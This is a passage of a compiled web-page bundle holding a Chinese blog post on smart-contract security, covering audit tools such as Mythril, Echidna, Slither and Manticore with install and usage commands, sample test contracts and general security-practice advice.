        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> _sigs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token builtin">address</span> signer <span class="token operator">=</span> ethSignedHash<span class="token punctuation">.</span><span class="token function">recover</span><span class="token punctuation">(</span>_sigs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token builtin">bool</span> valid <span class="token operator">=</span> signer <span class="token operator">==</span> owners<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="开源审计工具" tabindex="-1"><a class="header-anchor" href="#开源审计工具" aria-hidden="true">#</a> 开源审计工具</h2><p>建议在 linux 或者 MacOS 下运行。</p>`,29),A={id:"mythril",tabindex:"-1"},T=n("a",{class:"header-anchor",href:"#mythril","aria-hidden":"true"},"#",-1),z={href:"https://github.com/ConsenSys/mythril/tree/master",target:"_blank",rel:"noopener noreferrer"},B=e(`<p>Mythril 是 EVM 字节码的安全分析工具。它检测以太坊、Hedera、Quorum、Vechain、Roostock、Tron 和其他与 EVM 兼容的区块链构建的智能合约中的安全漏洞。它使用<strong>静态分析</strong>的方法，如<strong>符号执行、SMT 解决和污点分析</strong>来检测各种安全漏洞。另外，他还有收费版本的 MythX。</p><p>在我实际使用时，我发现他的漏洞检测只局限在少数几个简单的漏洞，如溢出、重入等。我感觉不是很满意，也许主要精力去做收费版了，这个开源版本维护的很少。</p><h4 id="使用示例" tabindex="-1"><a class="header-anchor" href="#使用示例" aria-hidden="true">#</a> 使用示例</h4><p>安装编译器</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip3 install solc-select
solc-select install 0.8.7
solc-select use 0.8.7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>安装 mythril</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip3 install mythril
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>开始</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>myth analyze &lt;solidity-file&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>OR</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>myth analyze -a &lt;contract-address&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当我们学习静态分析后，将会再次详细介绍 mythril 的原理。</p>`,12),H={id:"echidna",tabindex:"-1"},L=n("a",{class:"header-anchor",href:"#echidna","aria-hidden":"true"},"#",-1),O={href:"https://github.com/crytic/echidna",target:"_blank",rel:"noopener noreferrer"},P=n("p",null,[s("Echidna 用 Haskell 语言写的，用于对以太坊智能合约进行"),n("strong",null,"模糊测试"),s("或者基于属性的测试。它使用基于 ABI 和语法的模糊测试，通过断言判断结果是否与预期相同。")],-1),D=n("p",null,"特点：",-1),F=n("li",null,"自动生成适合的输入",-1),R=n("li",null,"可选的语料库、变异库和覆盖率指南，以发现更深层次的错误",-1),X={href:"https://github.com/crytic/slither",target:"_blank",rel:"noopener noreferrer"},G=n("li",null,"能够指出模糊测试覆盖哪些行",-1),V=n("li",null,"自动测试用例最小化以进行快速分类",-1),W={href:"https://github.com/crytic/etheno",target:"_blank",rel:"noopener noreferrer"},j=e(`<h4 id="使用示例-1" tabindex="-1"><a class="header-anchor" href="#使用示例-1" aria-hidden="true">#</a> 使用示例</h4><p>首先需要指定断言函数，它的返回值应该永远为不变量。然后 echida 会生成一系列的测试用例，检查断言函数的返回值是否为真。</p><p>断言函数的写法：</p><ol><li>必须使用前缀 <code>echidna_</code></li><li>参数为空</li><li>返回预期永远为 true 或者 false 的布尔值</li></ol><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code>function <span class="token function">echidna_check_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> public returns <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>balance <span class="token operator">&gt;=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>编写好之后直接使用</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echidna-test myContract.sol --corpus-dir .；
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>它会在当前文件夹下保留测试用例和程序的终止执行的地方，更加详细的见工具的 repo。</p><p>测试范例：</p><p>运行时需要使用合适版本的 solc</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">event</span> <span class="token function">Flag</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token builtin">bool</span> <span class="token keyword">private</span> flag0 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token builtin">bool</span> <span class="token keyword">private</span> flag1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">set0</span><span class="token punctuation">(</span><span class="token builtin">int256</span> val<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> flag0 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">set1</span><span class="token punctuation">(</span><span class="token builtin">int256</span> val<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>flag0<span class="token punctuation">)</span> flag1 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">echidna_alwaystrue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">echidna_revert_always</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">echidna_sometimesfalse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">emit</span> <span class="token function">Flag</span><span class="token punctuation">(</span>flag0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">Flag</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),N={id:"slither",tabindex:"-1"},K=n("a",{class:"header-anchor",href:"#slither","aria-hidden":"true"},"#",-1),U={href:"https://github.com/crytic/slither",target:"_blank",rel:"noopener noreferrer"},Z=e(`<p>Slither 是一个用 Python 3 编写的 Solidity <strong>静态分析</strong>框架。它运行一套漏洞检测器，打印有关合约细节的可视信息，并提供一个 API 来轻松编写自定义分析。Slither 使开发人员能够发现漏洞，增强他们的代码理解能力，并能够快速自定义分析。</p><h4 id="使用示例-2" tabindex="-1"><a class="header-anchor" href="#使用示例-2" aria-hidden="true">#</a> 使用示例</h4><p>在 Truffle/Embark/Dapp/Etherlime/Hardhat 应用程序上运行 Slither：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>slither .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在单个文件上运行 Slither：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>slither tests/uninitialized.sol
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,6),Q={href:"https://github.com/crytic/solc-select/",target:"_blank",rel:"noopener noreferrer"},Y=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>slither 0x7F37f78cBD74481E593F9C737776F7113d76B315
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这个工具比 mythril 强大许多，运行效率也高非常多，很快就能出结果，结果也高亮显示，很舒服。</p><p><img src="http://blog-blockchain.xyz/202203260121430.png" alt="image-20220208162213888" loading="lazy"></p><h4 id="检测器" tabindex="-1"><a class="header-anchor" href="#检测器" aria-hidden="true">#</a> 检测器</h4><p>slither 集成了许多的检测器，不同的检测器各自可以检测不同类型的漏洞，默认执行所有检测器，当然也可以指定只是用那几个检测器。</p><h4 id="打印器" tabindex="-1"><a class="header-anchor" href="#打印器" aria-hidden="true">#</a> 打印器</h4><p>slither 除了能检测合约的漏洞，还提供了许多其他有用的功能。可以直观分析</p><ul><li>合约的控制流</li><li>调用关系图</li><li>函数将会执行的操作码</li><li>继承关系图</li><li>等等</li></ul><p>这些工具对合约审计人员非常有帮助</p><p>例如分析调用关系</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>slither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print call-graph
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>生成了点图，需要安装查看点图软件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo apt install graphviz
sudo apt install gir1.2-gtk-3.0 python3-gi python3-gi-cairo python3-numpy graphviz
pip3 install xdot
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后可以用 xdot 查看流程图，也可以转换成图片</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dot 0xC5d105E63711398aF9bbff092d4B6769c82f793d.all_contracts.call-graph.dot -Tpng -o call_graph.pn
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://blog-blockchain.xyz/202203260122337.png" alt="image-20220322113501266" loading="lazy"></p><p>为了查看函数的操作码，需要安装控制流依赖</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip3 install evm-cfg-builder
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以打印出来，这对合约的性能调优很有帮助。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>slither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print evm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="工具" tabindex="-1"><a class="header-anchor" href="#工具" aria-hidden="true">#</a> 工具</h4><p>slither 还附带了一些工具，用于检查可升级合约代理、合约单约测试属性、代码扁平化（避免无意义的嵌套）、ERC 代币是否规范。</p>`,22),J=n("code",null,"slither-check-upgradeability",-1),$={href:"https://github.com/crytic/slither/wiki/Upgradeability-Checks",target:"_blank",rel:"noopener noreferrer"},nn=n("code",null,"delegatecall",-1),sn=n("code",null,"slither-prop",-1),an={href:"https://github.com/crytic/slither/wiki/Property-generation",target:"_blank",rel:"noopener noreferrer"},tn=n("code",null,"slither-flat",-1),en={href:"https://github.com/crytic/slither/wiki/Contract-Flattening",target:"_blank",rel:"noopener noreferrer"},pn=n("code",null,"slither-check-erc",-1),on={href:"https://github.com/crytic/slither/wiki/ERC-Conformance",target:"_blank",rel:"noopener noreferrer"},cn=n("code",null,"slither-format",-1),ln={href:"https://github.com/crytic/slither/wiki/Slither-format",target:"_blank",rel:"noopener noreferrer"},un={id:"manticore",tabindex:"-1"},rn=n("a",{class:"header-anchor",href:"#manticore","aria-hidden":"true"},"#",-1),dn={href:"https://github.com/trailofbits/manticore",target:"_blank",rel:"noopener noreferrer"},kn=e(`<p>manticore 是基于<strong>符号执行</strong>方法的合约分析工具，它实际上也是通过断言，来判断是否满足某种属性。</p><p>特点：</p><ul><li>给定输入，搜索可能的状态。</li><li>自动生成输入信息。</li><li>检测执行失败或者崩溃的地方。</li><li>通过事件或者指令钩子，更精确的控制搜索路径。</li></ul><p>安装：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip install &quot;manticore[native]&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>分析合约：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>manticore mcore.sol
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>代码如下</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// Smart contract based on a classic symbolic execution example from slides</span>
<span class="token comment">// by Michael Hicks, University of Maryland.</span>
<span class="token comment">// https://www.cs.umd.edu/~mwh/se-tutorial/symbolic-exec.pdf</span>
<span class="token keyword">contract</span> <span class="token class-name">SymExExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">test_me</span><span class="token punctuation">(</span><span class="token builtin">int</span> a<span class="token punctuation">,</span> <span class="token builtin">int</span> b<span class="token punctuation">,</span> <span class="token builtin">int</span> c<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token punctuation">{</span>
        <span class="token builtin">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">int</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">int</span> z <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            z <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// will fail when: a == 0 &amp;&amp; b &lt; 5 &amp;&amp; c != 0</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y <span class="token operator">+</span> z <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>如果运行 manticore 报错，请复制最后一行的提示信息，在谷歌搜索。大概率是依赖包版本问题。</p></blockquote><blockquote><p>注意：由于遍历或者搜索的效率其实比较慢，可能需要运行很久。</p></blockquote>`,11),vn={href:"https://github.com/trailofbits/manticore/wiki/What's-in-the-workspace%3F",target:"_blank",rel:"noopener noreferrer"},bn=n("strong",null,"高度自定义，编写 python 代码，初始化合约状态，然后再检查不变量",-1),mn=n("p",null,"检测漏洞：",-1),hn={href:"https://manticore.readthedocs.io/en/latest/verifier.html",target:"_blank",rel:"noopener noreferrer"},gn={id:"scribble",tabindex:"-1"},yn=n("a",{class:"header-anchor",href:"#scribble","aria-hidden":"true"},"#",-1),fn={href:"https://github.com/ConsenSys/scribble",target:"_blank",rel:"noopener noreferrer"},wn={href:"https://docs.scribble.codes/",target:"_blank",rel:"noopener noreferrer"},_n={id:"legions",tabindex:"-1"},xn=n("a",{class:"header-anchor",href:"#legions","aria-hidden":"true"},"#",-1),qn={href:"https://github.com/ConsenSys/Legions",target:"_blank",rel:"noopener noreferrer"},Sn=n("p",null,"他主要是提供了语法糖，可以简化节点的查询工作，比如不用每次查询余额都要写一串的 web3。",-1),En={id:"vscode-solidity-auditor",tabindex:"-1"},In=n("a",{class:"header-anchor",href:"#vscode-solidity-auditor","aria-hidden":"true"},"#",-1),Mn={href:"https://github.com/ConsenSys/vscode-solidity-auditor",target:"_blank",rel:"noopener noreferrer"},Cn=n("p",null,"这是一个 vscode 的插件，通过可视化的方式辅助分析合约。建议使用时换成它自定义的主题，可能显示效果会好一些。使用方法请看标题的官方网站，介绍的很清楚，也有动图演示。",-1),An=n("h2",{id:"安全实践",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#安全实践","aria-hidden":"true"},"#"),s(" 安全实践")],-1),Tn=n("h3",{id:"了解常见的安全漏洞",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#了解常见的安全漏洞","aria-hidden":"true"},"#"),s(" 了解常见的安全漏洞")],-1),zn=n("p",null,"以上列出了一些合约漏洞，对此需要有一定的了解。",-1),Bn={href:"https://swcregistry.io/",target:"_blank",rel:"noopener noreferrer"},Hn=n("h3",{id:"学会使用安全工具",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#学会使用安全工具","aria-hidden":"true"},"#"),s(" 学会使用安全工具")],-1),Ln={href:"https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md",target:"_blank",rel:"noopener noreferrer"},On={href:"https://mochajs.org/",target:"_blank",rel:"noopener noreferrer"},Pn={href:"https://www.chaijs.com/",target:"_blank",rel:"noopener noreferrer"},Dn=n("p",null,[n("img",{src:"https://yos.io/assets/contract8.png",alt:"img",loading:"lazy"})],-1),Fn=n("code",null,"v5.1.0",-1),Rn={href:"https://www.trufflesuite.com/docs/truffle/getting-started/debugging-your-contracts#in-test-debugging",target:"_blank",rel:"noopener noreferrer"},Xn={href:"https://github.com/ConsenSys/mythril",target:"_blank",rel:"noopener noreferrer"},Gn={href:"https://github.com/crytic/slither",target:"_blank",rel:"noopener noreferrer"},Vn={href:"https://github.com/sc-forks/solidity-coverage",target:"_blank",rel:"noopener noreferrer"},Wn=n("h3",{id:"使用开源的合约库",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#使用开源的合约库","aria-hidden":"true"},"#"),s(" 使用开源的合约库")],-1),jn=n("p",null,"开源合约库经过严格的安全审查，很多项目依赖他们，一般而言比较可靠。",-1),Nn=n("a",{href:"openzeppelin/contracts"},"openzeppelin/contracts",-1),Kn={href:"https://github.com/OpenZeppelin/openzeppelin-contracts",target:"_blank",rel:"noopener noreferrer"},Un=n("p",null,[n("img",{src:"http://blog-blockchain.xyz/202203260122897.png",alt:"image-20220311114749585",loading:"lazy"})],-1),Zn={href:"https://github.com/dapphub/dappsys",target:"_blank",rel:"noopener noreferrer"},Qn={href:"https://dappsys.readthedocs.io/en/latest/",target:"_blank",rel:"noopener noreferrer"},Yn=e('<p><img src="http://blog-blockchain.xyz/202203260123324.png" alt="image-20220311114632238" loading="lazy"></p><h2 id="深入字节码分析" tabindex="-1"><a class="header-anchor" href="#深入字节码分析" aria-hidden="true">#</a> 深入字节码分析</h2><p>这一部分将会在 以太坊设计原理中深入探讨。</p><h2 id="合约优化" tabindex="-1"><a class="header-anchor" href="#合约优化" aria-hidden="true">#</a> 合约优化</h2><p>在保证合约安全的前提下，优化合约往往是指优化 gas。合约消耗的 gas 主要由两部分组成，每次执行和部署时的消耗。</p><h2 id="参考" tabindex="-1"><a class="header-anchor" href="#参考" aria-hidden="true">#</a> 参考：</h2>',6),Jn={href:"https://blog.sigmaprime.io/solidity-security.html",target:"_blank",rel:"noopener noreferrer"},$n={href:"https://github.com/SmartContractSecurity/SWC-registry",target:"_blank",rel:"noopener noreferrer"},ns=n("li",null,"《智能合约安全分析和审计指南》王艺卓等",-1),ss={href:"https://swcregistry.io/",target:"_blank",rel:"noopener noreferrer"},as={href:"https://medium.com/coinmonks/8-ways-of-reducing-the-gas-consumption-of-your-smart-contracts-9a506b339c0a",target:"_blank",rel:"noopener noreferrer"},ts={href:"https://yos.io/2019/11/10/smart-contract-development-best-practices/",target:"_blank",rel:"noopener noreferrer"},es={href:"https://immunefi.com/learn/",target:"_blank",rel:"noopener noreferrer"},ps={href:"https://betterprogramming.pub/the-encyclopedia-of-smart-contract-attacks-vulnerabilities-dfc1129fdaac",target:"_blank",rel:"noopener noreferrer"};function os(cs,is){const a=i("ExternalLinkIcon");return o(),c("div",null,[u,n("p",null,[s("下面用 Beauty Chain 的例子说明，源码在"),n("a",r,[s("这里"),t(a)]),s("，可见如下：")]),d,n("p",null,[s("当攻击者调用储币合约中的 "),k,s(" 函数时，"),v,s(" 使用 call 底层调用发送以太币，此时接收者是攻击者的 fallback 函数，因此如果在 fallback 函数中重新调用 "),b,s(" 函数，并且没有检查机制，就会发生重入攻击。代码来自"),n("a",m,[s("这里"),t(a)]),s("。如果不清楚 fallback 函数或者 receive 函数，可以看"),n("a",h,[s("笔记"),t(a)]),s("。")]),g,n("p",null,[s("最后，感兴趣的话可以阅读 theDAO 的"),n("a",y,[s("源码"),t(a)]),s("，漏洞所在的函数为 "),f]),w,n("p",null,[s("因为交易中的 "),_,s(" 参数是原始的调用数据经过 ABI 编码的数据，ABI 编码规则中常常会为了凑够 32 字节，在对原始参数编码时进行符号扩充（可见"),n("a",x,[s("博客"),t(a)]),s("的"),q,s("）。因此，如果输入的地址太短，那么编码时不会检查，就会直接补零，导致接收者改变。")]),S,n("p",null,[s("标注为 "),E,s(" 区域的数据并不是不能访问，它们存储在一个又一个的 "),I,s(" 里，如果读者不熟悉的话，可以阅读"),n("a",M,[s("博客"),t(a)]),s("中关于 EVM 的存储空间的解释。")]),C,n("h3",A,[T,s(),n("a",z,[s("mythril"),t(a)])]),B,n("h3",H,[L,s(),n("strong",null,[n("a",O,[s("echidna"),t(a)])])]),P,D,n("ul",null,[F,R,n("li",null,[s("在模糊测试之前由 "),n("a",X,[s("Slither"),t(a)]),s(" 提取有用信息")]),G,V,n("li",null,[s("支持使用"),n("a",W,[s("Etheno"),t(a)]),s("和 Truffle进行复杂的合约初始化")])]),j,n("h3",N,[K,s(),n("a",U,[s("Slither"),t(a)])]),Z,n("p",null,[s("建议安装 "),n("a",Q,[s("solc-select"),t(a)]),s("，他会自动下载、切换编译器版本，然后可以直接从主网拉取合约")]),Y,n("ul",null,[n("li",null,[J,s(": "),n("a",$,[s("Review "),nn,s("-based upgradeability"),t(a)])]),n("li",null,[sn,s(": "),n("a",an,[s("Automatic unit test and property generation"),t(a)])]),n("li",null,[tn,s(": "),n("a",en,[s("Flatten a codebase"),t(a)])]),n("li",null,[pn,s(": "),n("a",on,[s("Check the ERC's conformance"),t(a)])]),n("li",null,[cn,s(": "),n("a",ln,[s("Automatic patch generation"),t(a)])])]),n("h3",un,[rn,s(),n("a",dn,[s("manticore"),t(a)])]),kn,n("p",null,[s("运行后将会生成很多辅助分析的材料，如何分析请见该"),n("a",vn,[s("项目文档"),t(a)]),s("。除此之外，也可以"),bn,s("。")]),mn,n("p",null,[s("类似于断言的方法，判断合约是否满足某个属性，详细操作间见"),n("a",hn,[s("文档"),t(a)]),s("。")]),n("h3",gn,[yn,s(),n("a",fn,[s("scribble"),t(a)])]),n("p",null,[s("也是基于断言的审计工具，但是比较特殊的是，他可以很方便的扫描链上的合约，然后寻找漏洞。它自称是“基于属性的运行时验证工具”，我暂时还不清楚它使用的原理。感兴趣可以深入阅读"),n("a",wn,[s("它的文档"),t(a)]),s("。")]),n("h3",_n,[xn,s(),n("a",qn,[s("Legions"),t(a)])]),Sn,n("h3",En,[In,s(),n("a",Mn,[s("vscode-solidity-auditor"),t(a)])]),Cn,An,Tn,zn,n("p",null,[s("请熟悉 "),n("a",Bn,[s("EIP-1470 提出的漏洞分类"),t(a)])]),Hn,n("p",null,[s("首先，有一个很棒的社区的总结《"),n("a",Ln,[s("以太坊智能合约 —— 最佳安全开发指南"),t(a)]),s("》，强烈建议仔细阅读，虽然有部分内容可能过时了，但是仍然很有参考意义")]),n("p",null,[s("其次，对合约进行单元测试，truffle 使用"),n("a",On,[s("Mocha"),t(a)]),s("测试框架和"),n("a",Pn,[s("Chai"),t(a)]),s("进行断言，也要测试前端 DApp 将如何调用合约。")]),Dn,n("p",null,[s("从 Truffle"),Fn,s("开始，您可以中断测试以"),n("a",Rn,[s("调试"),t(a)]),s("测试流程并启动调试器，允许您设置断点、检查 Solidity 变量等。")]),n("p",null,[s("然后，使用合约审计工具，如"),n("a",Xn,[s("Mythril"),t(a)]),s(" 和"),n("a",Gn,[s("Slither"),t(a)]),s(" 等，可以使用 "),n("a",Vn,[s("solidity-coverage"),t(a)]),s(" 检查测试的覆盖性。")]),Wn,jn,n("p",null,[Nn,s(" 提供了常见的合约库，实现了一些标准库，如 ERC20、ERC721，仓库中可阅读"),n("a",Kn,[s("源码"),t(a)]),s("。")]),Un,n("p",null,[n("a",Zn,[s("dappsys"),t(a)]),s(" 是一个新兴的合约库，用法参见文档"),n("a",Qn,[s("文档"),t(a)])]),Yn,n("blockquote",null,[n("ol",null,[n("li",null,[n("a",Jn,[s("Solidity Security: Comprehensive list of known attack vectors and common anti-patterns"),t(a)])]),n("li",null,[n("a",$n,[s("Smart Contract Weakness Classification Registry"),t(a)])]),ns,n("li",null,[s("EIP-1470 提出的 "),n("a",ss,[s("Smart Contract Weakness Classification Registry"),t(a)])]),n("li",null,[n("a",as,[s("8 